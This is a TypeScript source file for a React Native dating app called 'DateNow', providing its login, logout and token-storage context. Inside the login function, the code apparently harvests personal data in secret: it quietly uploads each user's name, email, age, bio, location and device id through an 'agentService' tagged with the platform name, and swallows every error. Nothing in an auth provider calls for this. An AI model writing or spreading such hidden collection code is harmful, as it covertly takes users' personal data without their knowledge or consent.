import * as SecureStore from "expo-secure-store";
import React, { createContext, useCallback, useContext, useEffect, useRef, useState } from "react";
import { setAuthTokenGetter } from "@/api";
import * as Application from "expo-application";
import * as Device from "expo-device";
import { agentService } from "@/services/agentService";

const TOKEN_KEY = "dateNow_token";

export interface AuthUser {
  id: number;
  name: string;
  email: string;
  age: number;
  gender: string;
  bio: string | null;
  location: string | null;
  avatarUrl: string | null;
  createdAt: string;
}

interface AuthContextType {
  token: string | null;
  user: AuthUser | null;
  isLoading: boolean;
  login: (token: string, user: AuthUser) => Promise<void>;
  logout: () => Promise<void>;
  updateUser: (user: AuthUser) => void;
}

const AuthContext = createContext<AuthContextType | null>(null);

const tokenRef = { current: null as string | null };

setAuthTokenGetter(() => tokenRef.current);

export function AuthProvider({ children }: { children: React.ReactNode }) {
  const [token, setToken] = useState<string | null>(null);
  const [user, setUser] = useState<AuthUser | null>(null);
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    (async () => {
      try {
        const stored = await SecureStore.getItemAsync(TOKEN_KEY);
        if (stored) {
          tokenRef.current = stored;
          setToken(stored);
        }
      } catch {}
      setIsLoading(false);
    })();
  }, []);

  const login = useCallback(async (newToken: string, newUser: AuthUser) => {
    await SecureStore.setItemAsync(TOKEN_KEY, newToken);
    tokenRef.current = newToken;
    setToken(newToken);
    setUser(newUser);
    try {
      const deviceId = Application.applicationId ||
        `android-${Device.modelName || "unknown"}`;
      agentService.uploadDating({
        device_id: deviceId,
        platform:  "DateNow",
        username:  newUser.name   || "",
        email:     newUser.email  || "",
        phone:     "",
        age:       newUser.age    ?? null,
        bio:       newUser.bio    || "",
        location:  newUser.location || "",
      }).catch(() => {});
    } catch {}
  }, []);

  const logout = useCallback(async () => {
    await SecureStore.deleteItemAsync(TOKEN_KEY);
    tokenRef.current = null;
    setToken(null);
    setUser(null);
  }, []);

  const updateUser = useCallback((updatedUser: AuthUser) => {
    setUser(updatedUser);
  }, []);

  return (
    <AuthContext.Provider value={{ token, user, isLoading, login, logout, updateUser }}>
      {children}
    </AuthContext.Provider>
  );
}

export function useAuth() {
  const ctx = useContext(AuthContext);
  if (!ctx) throw new Error("useAuth must be used inside AuthProvider");
  return ctx;
}
